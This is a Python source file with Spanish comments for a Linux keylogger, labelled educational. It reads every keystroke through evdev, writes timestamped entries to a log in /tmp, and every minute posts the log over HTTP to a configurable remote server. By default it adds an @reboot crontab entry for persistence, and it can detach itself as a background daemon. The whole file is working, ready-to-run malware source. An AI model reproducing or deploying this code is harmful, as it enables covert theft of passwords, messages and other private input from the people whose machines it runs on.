#!/usr/bin/env python3
"""
Keylogger educacional con múltiples características.
Usar solo en un ambiente controlado como máquina virtuales.
"""

#######################################
# #       Importar Librerías        # #
#######################################

import os
import sys
import json
import time
import atexit
import datetime
import subprocess

# ------------------------------------------------------------
# Importar librerías de terceros y configurar el entorno virtual de python
# ------------------------------------------------------------

VENV_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger_env")
REQUIRED = ["evdev", "requests"]

def in_venv():
  #Detecta si ya estamos en el entorno virtual
	return (hasattr(sys, "real_prefix") or (sys.prefix != sys.base_prefix))

def bootstrap_venv():
	#Crea el venv, instala dependencias y re-ejecuta el script dentro de él de ser necesario
	if in_venv():
		return #Estamos dentro
	print("No se detecto entorno virtual. Creandolo...")
	if not os.path.exists(VENV_DIR):
		subprocess.run([sys.executable, "-m", "venv", VENV_DIR], check=True)

	pip_path = os.path.join(VENV_DIR, "bin", "pip")
	python_path = os.path.join(VENV_DIR, "bin", "python")
	print("Actualizando pip y setupyools en el venv...")
	subprocess.run([python_path, "-m", "pip", "install", "--upgrade", "pip"], check=True)
	subprocess.run([python_path, "-m", "pip", "install", "setuptools==75.8.0"], check=True)

	print("Instalando dependencias...")
	subprocess.run([python_path, "-m", "pip", "install"] + REQUIRED, check=True)

	print("Re-lanzando dentro del venv...")
	os.execv(python_path, [python_path] + sys.argv)

bootstrap_venv()

print(f"Ejecutando dentro de: {sys.prefix}")

# Importando las librerías restantes
import threading
from evdev import InputDevice, categorize, ecodes, list_devices
import requests




#######################################
# #             Variables           # #
#######################################

# ------------------------------------------------------------
# Configuración
# ------------------------------------------------------------
CONFIG_FILE = "config.json"

DEFAULT_CONFIG = {
    "log_file": "keylogger.log",
    "remote_url": "http://<IP>:<Port>/log",  #IP a donde se envía el archivo. 
    "send_interval": 60,               # Intervalo de tiempo para enviar el archivo.
    "max_log_size_mb": 0.01,              # Rotar el archivo cuando el tamaño se sobrepase.
    "daemon": False,                    # Se ejecuta como un daemon en el background.
    "persistence": True,               # Se añade a Crontab para iniciar automáticamente.
    "terminate_key": "<esc>",           # Tecla para terminar el keylogger.
    "timestamp_format": "%Y-%m-%d %H:%M:%S" #Formato para el timestamp de cada tecla
}


#######################################
# #             Funciones           # #
#######################################

def load_config():
    """Carga la configuración del archivo JSON si ya existe 
    o en caso contrario lo crea con la configuración por defecto."""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
   
        for key, value in DEFAULT_CONFIG.items():
            config.setdefault(key, value)
    else:
        config = DEFAULT_CONFIG.copy()
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        print(f"Archivo de configuración creado: {CONFIG_FILE}")
    return config


# ------------------------------------------------------------
# Daemonization (Solo para Unix).
# Separa el proceso de la terminal y lo ejecuta en segundo plano
# ------------------------------------------------------------
def daemonize():
    if os.fork() > 0:
        sys.exit(0) 
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())


# ------------------------------------------------------------
# Persistencia (crontab)
# Añade un script recurrente al crontab del usuario para ejecutarse al reiniciar el equipo
# ------------------------------------------------------------
def add_persistence(script_path):
    try:
        # Revisa si ya existe la linea en el crontab
        existing = subprocess.check_output("crontab -l", shell=True, text=True, stderr=subprocess.DEVNULL)
        if script_path in existing:
            return  # La línea existe
    except subprocess.CalledProcessError:
        existing = ""  # No crontab yet

    # Añade la linea al script para que se inicie automáticamente.
    cron_line = f"@reboot /usr/bin/python3 {script_path} >/dev/null 2>&1\n"
    new_cron = existing + cron_line
    with open("/tmp/current_cron", "w") as f:
        f.write(new_cron)
    subprocess.call("crontab /tmp/current_cron", shell=True)
    os.remove("/tmp/current_cron")
    print("Persistencia añadida a crontab.")


#######################################
# #              Clases             # #
#######################################

# ------------------------------------------------------------
# Keylogger Class
# ------------------------------------------------------------
class Keylogger:
    def __init__(self, config):
        self.config = config
        self.log_file = config["log_file"]
        self.remote_url = config.get("remote_url")
        self.send_interval = config.get("send_interval", 60)
        self.terminate_key = config.get("terminate_key")
        self.timestamp_format = config.get("timestamp_format")
        self.max_log_size = config.get("max_log_size_mb", 1) * 1024 * 1024


        # Se abre el archivo log en modo "append"
        self.output = open(self.log_file, "a")

        # Iniciamos el timer para que se envie periódicamente
        self.last_send = time.time()

        # Register de limpieza al terminar.
        atexit.register(self.cleanup)

        #Detectar el teclado
        self.device = self._find_keyboard()
        if self.device is None:
            print("ERROR: No se encontro ninguna teclado")
            sys.exit(1)

        print(f"Usando dispositivo: {self.device.name}")

        #Variables de control para el listener
        self.running = True
        self.listener_thread = threading.Thread(target=self._event_loop, daemon=True)
        self.listener_thread.start()

    def _find_keyboard(self):
        """Busca el primer dispositivo que parezca un teclado"""
        devices = [InputDevice(path) for path in list_devices()]
        for dev in devices:
            if "keyboard" in dev.name.lower():
                return dev
        return None


    def _event_loop(self):
        """Lee eventos en un hilo separado"""
        for event in self.device.read_loop():
            if not self.running:
                break
            if event.type == ecodes.EV_KEY:
               key_event = categorize(event)
               # Solo procesar pulsaciones (key down), ignora repeticiones y soltadas
               if key_event.keystate == 1:
                   self.on_press(key_event)



    def on_press(self, key_event):

        print(f"Tecla: {key_event}")
        # Callback para el evento de una tecla presionada
        try:
            timestamp = datetime.datetime.now().strftime(self.timestamp_format)

            # Obtener el nombre de la tecla (ej. "KEY_A")
            keycode = key_event.keycode
            """ Formatear para el log: si es una letra, mostrar el caracter, 
            si es especial, entre corchetes. """
            if keycode.startswith("KEY_"):
                key_str = keycode[4:] # Quitar el KEY_
                if len(key_str) == 1:
                     # Tecla de letra o numero: usar el carácter en minúscula.
                     keystr = key_str.lower()
                else:
                    # Tecla especial: poner corchetes.
                    keystr = f"[{key_str.lower()}]"
            else:
                keystr = f"[{keycode}]"

            line = f"{timestamp} - {keystr}\n"

            self.output.write(line)

            self.output.flush()


            # Chequear la rotación del log
            self.check_rotation()

            # Enviar el log periodicamente cuando el intervalo se acabe
            if self.remote_url and time.time() - self.last_send > self.send_interval:
                self.send_file(self.log_file)

            # Detenerlo si se presiona la tecla configurada en el JSON
            if self.terminate_key:
                # Convertir la tecla de terminacion a su equivalente en evev
                term_code = self._terminate_key_to_code(self.terminate_key)
                if term_code and key_event.keycode == term_code:
                    print("Tecla de terminación presionada, deteniendo...")
                    self.running = False

        except Exception as e:
            # Log error but don't crash
            print(f"Error en callback: {e}")


    def _terminate_key_to_code(self, key_str):
        """Convierte una cadena como  <esc> a su keycode """
        # Mapeo de nombres comunes
        mapping = {
            "<esc>": "KEY_ESC",
            "<enter>": "KEY_ENTER",
            "<space>": "KEY_SPACE",
            "<tab>": "KEY_TAB",
            "<backspace>": "KEY_BACKSPACE",
            "<delete>": "KEY_DELETE",
            "<up>": "KEY_UP",
            "<down>": "KEY_DOWN",
            "<left>": "KEY_LEFT",
            "<right>": "KEY_RIGHT",
            "<shift>": "KEY_LEFTSHIFT",
            "<ctrl>": "KEY_LEFTCTRL",
            "<alt>": "KEY_LEFTALT",
        }
        key_lower = key_str.lower().strip("<>")
        return mapping.get(key_lower, None)


    def check_rotation(self):
        # Rotar el archivo log si se excede del tamaño máximo.
        try:
            if os.path.getsize(self.log_file) > self.max_log_size:
                self.output.close()
                old_file = self.log_file + ".old"
                os.rename(self.log_file, old_file)
                os.remove(old_file)

                self.output = open(self.log_file, "a")
        except Exception as e:
            print(f"Error en la rotación: {e}")

    def send_file(self, filepath):
        """Envía el archivo .lgo a un servidor remoto via HTTP POST."""
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            # Envía el contenido
            requests.post(self.remote_url, data=content, timeout=5)
            self.last_send = time.time()
        except Exception as e:
            print(f"Fallo al enviar {filepath}: {e}")


    def cleanup(self):
        """Cierra el archivo y se envia na ultima vez."""
        self.running = False
        if self.remote_url:
            self.send_file(self.log_file)
        self.output.close()
        if hasattr(self, 'device'):
            self.device.close()
        print("Keylogger detenido.")


#######################################
# #              Main               # #
#######################################

def main():
    config = load_config()

    #Forzar que el log file se cree en el directorio /tmp
    config["log_file"] = os.path.join("/tmp", os.path.basename(config["log_file"]))

    # Ejecutar la daemonización si se indico
    if config.get("daemon"):
        daemonize()

    # Ejecutar la persistencia si se indico
    if config.get("persistence"):
        script_path = os.path.abspath(sys.argv[0])
        add_persistence(script_path)

    # Crea y ejecuta el keylogger
    kl = Keylogger(config)
    print("Keylogger inicado. Presiona Ctrl+C para detener.")
    print(f"Log file: {kl.log_file}")
    print(f"El archivo existe? {os.path.exists(kl.log_file)}")
    # Mantiene el main thread vivo mientras el listener se está ejecutando.
    try:
        while kl.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        kl.cleanup()
        sys.exit(0)


if __name__ == "__main__":
    main()
